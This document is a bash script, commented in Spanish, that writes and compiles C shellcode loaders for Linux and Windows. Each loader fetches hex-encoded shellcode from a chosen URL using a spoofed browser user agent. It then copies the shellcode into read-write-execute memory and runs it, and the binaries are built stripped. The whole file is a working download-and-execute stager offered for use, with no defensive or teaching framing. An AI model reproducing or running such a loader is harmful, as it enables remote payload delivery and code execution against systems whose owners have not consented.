#!/bin/bash

TARGET=""
URL=""
USER_AGENT="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
TIMEOUT=15
MAX_SIZE=2097152  # 2MB

usage() {
    echo "Usage: $0 --target <linux|windows> --url <url>"
    echo "INSTALL: "
    echo "sudo apt update"
    echo "sudo apt install gcc mingw-w64 curl libcurl4-openssl-dev"
    exit 1
}

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --target) TARGET="$2"; shift ;;
        --url) URL="$2"; shift ;;
        *) echo "Unknown parameter: $1"; usage ;;
    esac
    shift
done

if [[ -z "$TARGET" || -z "$URL" ]]; then
    usage
fi

if [[ "$TARGET" != "linux" && "$TARGET" != "windows" ]]; then
    echo "Target must be 'linux' or 'windows'"
    exit 1
fi

cat > Makefile << 'EOF'
# Makefile

.PHONY: linux windows clean

linux: loader_linux.c
        gcc loader_linux.c -o loader_linux -lcurl -s -O2

windows: loader_windows.c
        x86_64-w64-mingw32-gcc loader_windows.c -o loader_windows.exe -lws2_32 -s -O2

clean:
        rm -f loader_linux loader_windows.exe loader_linux.c loader_windows.c


# Escapar caracteres para C
# ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
# ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')
EOF

case $TARGET in
    linux)
        # Escapar caracteres para C
        ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
        ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')

        cat > loader_linux.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <curl/curl.h>

// Config
const char* SHELLCODE_URL = "$ESCAPED_URL";
const char* USER_AGENT     = "$ESCAPED_UA";
const long TIMEOUT         = $TIMEOUT;
const size_t MAX_SIZE      = $MAX_SIZE;

// Buffer para datos descargados
struct MemoryStruct {
    char* memory;
    size_t size;
};

static size_t WriteMemoryCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t realsize = size * nmemb;
    struct MemoryStruct* mem = (struct MemoryStruct*)userp;
    if (mem->size + realsize >= MAX_SIZE) return 0;
    char* ptr = realloc(mem->memory, mem->size + realsize + 1);
    if (!ptr) return 0;
    mem->memory = ptr;
    memcpy(&(mem->memory[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->memory[mem->size] = 0;
    return realsize;
}

int main() {
    CURL* curl;
    CURLcode res;
    struct MemoryStruct chunk;
    chunk.memory = malloc(1);
    chunk.size = 0;

    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "curl init failed\\n");
        free(chunk.memory);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, SHELLCODE_URL);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteMemoryCallback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)&chunk);
    curl_easy_setopt(curl, CURLOPT_USERAGENT, USER_AGENT);
    curl_easy_setopt(curl, CURLOPT_TIMEOUT, TIMEOUT);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "Download failed: %s\\n", curl_easy_strerror(res));
        curl_easy_cleanup(curl);
        free(chunk.memory);
        curl_global_cleanup();
        return 1;
    }

    // Extraer shellcode: \\x41\\x42...
    const char* text = chunk.memory;
    size_t len = chunk.size;
    unsigned char* shellcode = NULL;
    size_t sc_len = 0;
    size_t capacity = 1024;
    shellcode = malloc(capacity);
    if (!shellcode) {
        free(chunk.memory);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
        return 1;
    }

    for (size_t i = 0; i < len - 3; i++) {
        if (text[i] == '\\\\' && text[i+1] == 'x') {
            char hex[3] = { text[i+2], text[i+3], '\\0' };
            // Corregido abajo:
        }
    }

    for (size_t i = 0; i < len - 3; i++) {
        if (text[i] == '\\\\' && text[i+1] == 'x') {
            char hex[3] = { text[i+2], text[i+3], '\\0' };
            char hex_str[3] = { 0 };
            hex_str[0] = text[i+2];
            hex_str[1] = text[i+3];
            char* end;
            long val = strtol(hex_str, &end, 16);
            if (end == hex_str + 2 && val >= 0 && val <= 255) {
                if (sc_len >= capacity) {
                    capacity *= 2;
                    unsigned char* tmp = realloc(shellcode, capacity);
                    if (!tmp) { free(shellcode); free(chunk.memory); curl_easy_cleanup(curl); curl_global_cleanup(); return 1; }
                    shellcode = tmp;
                }
                shellcode[sc_len++] = (unsigned char)val;
            }
            i += 3;
        }
    }

    free(chunk.memory);
    curl_easy_cleanup(curl);
    curl_global_cleanup();

    if (sc_len == 0) {
        fprintf(stderr, "No shellcode found\\n");
        free(shellcode);
        return 1;
    }

    printf("Loaded %zu bytes of shellcode\\n", sc_len);

    // Asignar memoria ejecutable
    void* mem = mmap(NULL, sc_len, PROT_READ | PROT_WRITE | PROT_EXEC,
                     MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mem == MAP_FAILED) {
        perror("mmap");
        free(shellcode);
        return 1;
    }

    memcpy(mem, shellcode, sc_len);
    free(shellcode);

    ((void(*)())mem)();

    sleep(30);

    return 0;
}
EOF

        echo "[+] Generated loader_linux.c"
        make linux
        ;;
    windows)
    # Escapar caracteres para C
    ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
    ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')

    # Generar loader_windows.c con marcadores
    cat > loader_windows.c << 'EOF'
    // loader_windows_fixed.c
    #include <winsock2.h>
    #include <windows.h>
    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    #pragma comment(lib, "ws2_32.lib")

    // Config
    const char* SHELLCODE_URL = "$ESCAPED_URL";
    const char* USER_AGENT     = "$ESCAPED_UA";
    const long TIMEOUT         = $TIMEOUT;
    const size_t MAX_SIZE      = $MAX_SIZE;

    // Estructura para acumular datos
    typedef struct {
        char* buffer;
        size_t size;
        size_t capacity;
    } Buffer;

    // Inicializa Winsock
    int init_winsock() {
        WSADATA wsa;
        return WSAStartup(MAKEWORD(2, 2), &wsa) == 0;
    }

    int buffer_append(Buffer* b, const char* data, size_t len) {
        if (b->size + len > b->capacity) {
            size_t new_cap = b->capacity ? b->capacity * 2 : 4096;
            while (new_cap < b->size + len) new_cap *= 2;
            char* new_buf = (char*)realloc(b->buffer, new_cap);
            if (!new_buf) return 0;
            b->buffer = new_buf;
            b->capacity = new_cap;
        }
        memcpy(b->buffer + b->size, data, len);
        b->size += len;
        return 1;
    }

    int extract_shellcode(const char* input, size_t len, unsigned char** out) {
        *out = NULL;
        unsigned char* sc = (unsigned char*)malloc(1024);
        size_t capacity = 1024;
        size_t count = 0;

        for (size_t i = 0; i < len - 3; i++) {
            if (input[i] == '\\' && input[i+1] == 'x' && i+3 < len) {
                char hex[3] = { input[i+2], input[i+3], '\0' };
                char* end;
                long val = strtol(hex, &end, 16);
                if (end == hex + 2 && val >= 0 && val <= 255) {
                    if (count >= capacity) {
                        capacity *= 2;
                        unsigned char* tmp = (unsigned char*)realloc(sc, capacity);
                        if (!tmp) { free(sc); return -1; }
                        sc = tmp;
                    }
                    sc[count++] = (unsigned char)val;
                    i += 3;  // Avanzar después de \xNN
                }
            }
        }

        if (count == 0) {
            free(sc);
            return 0;
        }

        *out = sc;
        return (int)count;
    }

    void sleep_ms(int ms) {
        Sleep(ms);
    }

    int main() {
        if (!init_winsock()) return 1;

        // Parsear URL
        const char* proto = strstr(SHELLCODE_URL, "://");
        if (!proto) return 1;
        proto += 3;

        const char* path = strchr(proto, '/');
        if (!path) path = "/";

        char host[256] = {0};
        int port = 80;

        size_t host_len = path - proto;
        if (host_len >= sizeof(host)) host_len = sizeof(host) - 1;
        strncpy(host, proto, host_len);

        char* colon = strchr(host, ':');
        if (colon) {
            port = atoi(colon + 1);
            *colon = '\0';
        }

        // Resolución DNS
        struct hostent* he = gethostbyname(host);
        if (!he) return 1;
        struct in_addr* addr = (struct in_addr*)he->h_addr_list[0];

        // Crear socket
        SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) return 1;

        struct sockaddr_in serv_addr;
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(port);
        serv_addr.sin_addr = *addr;

        if (connect(sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
            closesocket(sock);
            WSACleanup();
            return 1;
        }

        // Enviar request
        char request[1024];
        int n = snprintf(request, sizeof(request),
            "GET %s HTTP/1.1\r\n"
            "Host: %s:%d\r\n"
            "User-Agent: %s\r\n"
            "Connection: close\r\n"
            "\r\n",
            path, host, port, USER_AGENT);

        send(sock, request, strlen(request), 0);

        // Recibir respuesta
        Buffer response = {0};
        char buffer[4096];
        int bytes;

        while ((bytes = recv(sock, buffer, sizeof(buffer) - 1, 0)) > 0) {
            if (response.size + bytes > MAX_SIZE) break;
            buffer[bytes] = '\0';
            if (!buffer_append(&response, buffer, bytes)) break;
        }
        closesocket(sock);
        WSACleanup();

        // Buscar cuerpo (después de \r\n\r\n)
        char* body = strstr(response.buffer, "\r\n\r\n");
        if (!body) {
            if (response.buffer) free(response.buffer);
            return 1;
        }
        body += 4;

        // Extraer shellcode
        unsigned char* shellcode;
        int sc_len = extract_shellcode(body, response.buffer + response.size - body, &shellcode);
        free(response.buffer);  // liberar buffer HTTP

        if (sc_len <= 0) return 1;

        // Asignar memoria ejecutable
        LPVOID exec_mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!exec_mem) {
            free(shellcode);
            return 1;
        }

        // Copiar shellcode
        memcpy(exec_mem, shellcode, sc_len);
        free(shellcode);  // ya no necesitamos el buffer original

        // Ejecutar shellcode
        ((void(*)())exec_mem)();

        Sleep(INFINITE);

        return 0;
    }

EOF

    # Ahora sí, reemplazar las variables
    sed -i "s|\$ESCAPED_URL|$ESCAPED_URL|g" loader_windows.c
    sed -i "s|\$ESCAPED_UA|$ESCAPED_UA|g" loader_windows.c
    sed -i "s|\$TIMEOUT|$TIMEOUT|g" loader_windows.c
    sed -i "s|\$MAX_SIZE|$MAX_SIZE|g" loader_windows.c

    echo "[+] Generated loader_windows.c"
    make windows
        ;;
esac
